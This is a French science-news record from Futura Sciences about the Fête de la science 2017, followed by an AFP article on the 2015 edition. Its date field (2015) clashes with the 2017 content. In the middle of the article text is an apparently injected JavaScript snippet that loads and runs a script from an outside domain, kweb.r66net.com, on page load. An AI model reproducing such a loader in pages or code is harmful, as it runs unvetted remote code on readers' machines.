{"title": "Fête de la science 2017 : découvrez le programme... et participez !", "newspaper": "Futura Sciences", "author": "Jean-Luc Goudet", "date_publi": "06/10/2015", "content": "Du 7 au 15 octobre, la science est à la fête. Le thème de cette année : le débat. Partout en France métropolitaine, des milliers de manifestations auront lieu à partir de ce weekend et jusqu'au suivant. Il y aura de belles choses à voir aussi à la télévision et sur Internet, notamment sur Futura. D'ailleurs, pour la première fois, nous vous proposons de participer ! Dans de très nombreuses villes françaises, les universités et les centres de recherche ouvriront leurs  portes , mais aussi des centres culturels ou des théâtres. On y débattra avec les  chercheurs , puisque c'est le thème de cette édition 2017. Il y aura aussi des parcours scientifiques, des conférences, des expositions... En tout,  « plus de 5.000 évènements dans 2.500 lieux différents »,  annonce le ministère de la Recherche. Le programme se trouve sur le  site de la Fête de la science . Il se présente sous la forme d'une carte zoomable qui permet facilement de trouver de quoi s'occuper autour de chez soi. La carte des évènements en France métropolitaine pour l'édition 2017 de la Fête de la science. Les Corses ne sont pas si absents qu'il y paraît. © DR                               La Fête de la science sur Futura et chez vous On remarque toutefois que les manifestations se concentrent en Métropole et en Guyane. La science sera pourtant fêtée en Corse, du 6 au 22 octobre (voir  Corse Net Infos ). Elle le sera aussi en  Guadeloupe , du 27 novembre au 2 décembre, et à  La Réunion , du 13 au 19 novembre. Elle l'a été en septembre en  Nouvelle-Calédonie  (avec un dernier évènement le 24 octobre) et l' université de Polynésie , à  Tahiti , est également au rendez-vous. La Fête de la science 2017 fera naître plus 5.000 évènements dans toute la France. Une occasion de rencontrer les chercheurs et de voir la science de près. © DR                               La télévision sera de la fête aussi avec les premiers épisodes de  L'Étincelle  (celle du scientifique subitement illuminé par une idée), une série diffusée sur France 3 tous les jours à 18 h 55. Nous verrons notamment les étincelles de  Cédric Villani  (mathématicien) et de Chantal Abergel (virologiste spécialiste des  virus géants ). Sur le Web, le site de la Fête de la science diffuse des documentaires d'Arte, à voir et à revoir. Le saviez-vous ? C’est la vingt-sixième édition de la Fête de la science. Elle a été initiée en 1991 par  Hubert Curien , alors ministre de la Recherche (ce physicien de formation fut plusieurs fois ministre après avoir présidé le Cnes et l’Agence spatiale européenne), quand il ouvrit au public les jardins du ministère. En 1992, l’évènement devint  La science en fête  ; changeant de nom, il s'est pérennisé jusqu’à aujourd’hui.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  Sur Futura, nous avons concocté notre petite fête personnelle, à laquelle nous vous convions. Les journalistes de la rédaction nous parleront d'un(e)  scientifique  qui les a marqués, inspirés ou fascinés. Et pourquoi pas vous ? Nous aimerions que vous aussi vous choisissiez votre scientifique préféré(e) avec quelques arguments. Le plus simple est de nous répondre sur notre  page Facebook . Nous publierons la semaine prochaine les belles idées qui auront germé. Bonne fête ! Pour en savoir plus Fête de la science 2015 : les chercheurs vous invitent Article AFP publié le 6 octobre 2015 La Fête de la science, qui démarre ce mercredi, fera la part belle à la  lumière , par exemple à la  photographie  et aux images de synthèse en 3D. Cette belle occasion de rencontrer la science et les chercheurs se concrétisera par des opérations portes ouvertes, des animations ou des conférences dans tous les départements. Pendant cinq jours, le 24 e  édition de la  Fête de la science  propose, à travers toute la France, plus de 3.000 événements, animations, expositions, débats, portes ouvertes et spectacles. Comme toujours quand il est question de faire comprendre les sciences, de vulgariser, les professionnels ont cherché des  applications  concrètes, des pratiques ludiques pour faire passer leurs savoirs. Ainsi, en Alsace, les scientifiques en herbe pourront découvrir les différentes techniques utilisées par la  police scientifique . Ils pourront, comme dans la célèbre série  Les experts , apprendre comment retrouver, à l'aide de la lumière, des traces de sang effacées ou déterminer les  empreintes génétiques  grâce à l'analyse de l' ADN . Dans le Limousin, le musée d'Arsonval propose de  mesurer la vitesse de la lumière  en direct. Et à Saint-Gobain, en Picardie, curieux ou passionnés pourront percer les secrets de lʼœil, la photographie 3D, les  illusions dʼoptique  et les interactions avec la lumière (sans oublier les végétaux avec la  photosynthèse ). Organisée par le ministère de lʼÉducation nationale, de lʼEnseignement supérieur et de la Recherche, cette fête ambitionne de faire partager des savoirs pour permettre de mieux appréhender le monde qui nous entoure et pourquoi pas de susciter des vocations. Pour expérimenter, tester, échanger et poser des  questions aux chercheurs , près de 90 villages des sciences sont mis en place. Ils regroupent dans un même lieu des espaces d'animations, de démonstrations, dʼexpositions organisés en quartiers thématiques. La Fête de la science 2015 : l'occasion de rencontrer les chercheurs dans une multitude d'événements. © Ministère de lʼÉducation nationale, de lʼEnseignement supérieur et de la Recherche                       Le climat et la COP 21 s'invitent à la Fête de la science De la  biodiversité  aux sciences de lʼunivers, en passant par les sciences humaines ou les  nanotechnologies , chacun pourra choisir son domaine de prédilection. Le village des Sciences des Prés-de-Vaux en Franche-Comté sera inauguré, en lumière bien sûr, mais aussi au son du Jazz Band de l'Orchestre universitaire de Besançon, une façon de faire un pont entre les  arts et les sciences . Les réjouissances commenceront jeudi avec deux journées consacrées aux scolaires. Au programme : découvertes de manipʼ, un jeu de « réponse à tout » et un parcours  interactif . La  COP 21  approchant à grand pas, le fête de la science lancera parallèlement le Train du  climat  qui fera le tour de la France. Au programme :  rencontres avec les citoyens , réflexion autour des connaissances scientifiques sur les conséquences du changement climatique et tour d'horizon des solutions envisagées pour en limiter les effets néfastes pour l'humanité. Le train partira mardi de Paris Gare de Lyon et fera étape, avec une douzaine de chercheurs à bord, dans 19 villes françaises jusqu'au 25 octobre 2015. ", "theme": "sciences"}